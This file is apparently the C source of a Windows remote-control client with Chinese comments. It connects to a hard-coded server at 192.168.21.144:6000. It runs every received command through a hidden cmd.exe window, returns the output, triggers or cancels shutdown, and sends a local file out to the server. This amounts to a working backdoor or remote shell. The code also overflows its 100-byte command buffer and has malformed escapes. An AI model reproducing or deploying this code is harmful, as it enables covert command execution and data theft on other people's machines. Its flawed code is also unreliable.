#include "Client.h"
#include <Winsock2.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32.lib")
 
#define MSG_LEN 1024
 
SOCKET sockClient; 
HANDLE hRead;
 
void post(char *msg)
{
    send(sockClient, msg, strlen(msg) + 1, 0);
   
}
void FileSend(SOCKET s, CHAR *filename)
{
    HANDLE hFile;
    char buf[MSG_LEN] = {0};   
    DWORD len = 0;
 
    printf("n\准备传输文件\n");
 
    hFile = CreateFile(
        filename,              
        GENERIC_READ,          
        0,                      
        NULL,                   
        OPEN_EXISTING,          
        FILE_ATTRIBUTE_NORMAL,  
        NULL                    
    );
 
    if (hFile == INVALID_HANDLE_VALUE) 
    { 
        printf("文件无法打开\n");
        return; 
    }
 
    
    ReadFile( hFile, buf, MSG_LEN, &len, NULL );
 
    // 将数据发送到服务端
    send(s, buf, strlen(buf) + 1, 0);
 
    
    send(s, "%%over%%", sizeof("%%over%%"), 0);
 
    // 关闭文件句柄
    CloseHandle( hFile );
}
 
DWORD WINAPI DataThreadProc (LPVOID lpThreadParameter)
{
    SOCKADDR_IN addrServerData; 
    SOCKET sockClientData;
 
    printf("进入子线程, 准备读取数据\n");
 
    sockClientData = socket(AF_INET, SOCK_STREAM, 0);
    addrServerData.sin_addr.S_un.S_addr = inet_addr("192.168.21.144");  
    addrServerData.sin_family = AF_INET;                          
    addrServerData.sin_port = htons(6000); // 设置数据传输地址
 
    
    connect(sockClientData, (SOCKADDR *)&addrServerData, sizeof(SOCKADDR));
 
    
    FileSend(sockClientData, "C:\1.txt");
 
    printf("文件发送完毕\n");
 
    return 0;
}
 
DWORD WINAPI ThreadProc (LPVOID lpThreadParameter)
{
    char buf[2048] = {0};    
    DWORD len = 0;
    
    while (ReadFile( hRead, buf, MSG_LEN, &len, NULL ))
    {
        post( buf );
        ZeroMemory( buf, MSG_LEN );
        Sleep(800);
    }
    CloseHandle( hRead );
    return 0;
}
 
int cmd(char *cmdStr, char *message)
{
    char command[1024] = {0};
    char buf[MSG_LEN] = {0};    
 
    HANDLE hWrite;
    STARTUPINFO si;        
    PROCESS_INFORMATION pi; 
    SECURITY_ATTRIBUTES sa;
 
    DWORD Tid;
 
   
    sprintf(command, "cmd.exe /c %s", cmdStr);
    
 
   
    sa.nLength = sizeof( sa );
    sa.bInheritHandle = TRUE; 
    sa.lpSecurityDescriptor = NULL;
 
    
    if( !CreatePipe(&hRead, &hWrite, &sa, 1024))
    {
        printf( "管道创建失败! Error: %x\n", (unsigned int)GetLastError() );
        return 1;
    }
 
   
    ZeroMemory( &si, sizeof( si ) );
    si.cb = sizeof( si ); 
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
    si.wShowWindow = SW_HIDE;              
    si.hStdOutput = si.hStdError = hWrite;  // 输出流和错误流指向管道写的一头
 
    // 创建子进程,运行命令,子进程是可继承的
    if ( !CreateProcess( 
        NULL,       
        command,   
        NULL,      
        NULL,     
        TRUE,       
        0,          
        NULL,        
        NULL,       
        &si,       
        &pi ) )    
    {
        printf( "创建进程失败! Error: %x\n", (unsigned int)GetLastError() );
        CloseHandle( hRead );
        CloseHandle( hWrite );
        return 1;
    }
     
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle( hWrite );
 
    CreateThread(
        NULL,       
        0,          
        ThreadProc, 
        hRead,      
        0,          
        &Tid        
    );
 
    
 
    return 0;
}
 
int run(char *recvCmd, char *message)
{
    if (strcmp(recvCmd, "test") == 0)
    {
        strcpy(message, "服务端你好，有什么事吗~");
    }
    else if (strcmp(recvCmd, "shutdown") == 0)
    {
        // 执行关机命令，设了个定时关机没直接关
        system("shutdown -s -t 60");
        strcpy(message, "客户端将在 1分钟后关闭");
    }
    else if (strcmp(recvCmd, "cancel") == 0)
    {
        // 注销关机命令
        system("shutdown -a");
        strcpy(message, "客户端定时关机已取消");
    }
    else if (strcmp(recvCmd, "exit") == 0)
    {
        return 1;
    }
    else
    {
        // 调用 cmd
        cmd(recvCmd, message);
    }
    return 0;
}
 
void main()
{
    int err = 0;
    char message[MSG_LEN] = {0};
    char recvCmd[100] = {0};
 
    SOCKADDR_IN addrServer; // 服务端地址
 
    WSADATA wsaData;
    WORD wVersionRequested;
 
    wVersionRequested = MAKEWORD( 2, 2 );
 
    err = WSAStartup( wVersionRequested, &wsaData );
 
    if ( err != 0 )
    {
        return;
    }
 
    if ( LOBYTE( wsaData.wVersion ) != 2 || HIBYTE( wsaData.wVersion ) != 2 )
    {
        // 启动错误，程序结束
        WSACleanup( );
        return;
    }
 
    
    sockClient = socket(AF_INET, SOCK_STREAM, 0);
 
   
    addrServer.sin_addr.S_un.S_addr = inet_addr("192.168.21.144"); // 服务端 IP 
    addrServer.sin_family = AF_INET;                           
    addrServer.sin_port = htons(6000);                         // 连接端口1234
 
    
    connect(sockClient, (SOCKADDR *)&addrServer, sizeof(SOCKADDR));
 
    while(1)
    {
        // 清空字符串
        ZeroMemory(recvCmd, sizeof(recvCmd));
        ZeroMemory(message, sizeof(message));
 
        
        recv(sockClient, recvCmd, MSG_LEN, 0);
         
        // 发送数据到服务端
        if (strlen(recvCmd) > 0)
        {
            printf("-- 收到命令: [%s]/n", recvCmd);
            if ( run(recvCmd, message) )
            {
                break;
            }
            // printf("Message: [%s] Length:%d/n", message, strlen(message) + 1);
            post(message);
        }
    }
   
    closesocket(sockClient);
    WSACleanup();
}
Client::Client(void)
{
}


Client::~Client(void)
{
}
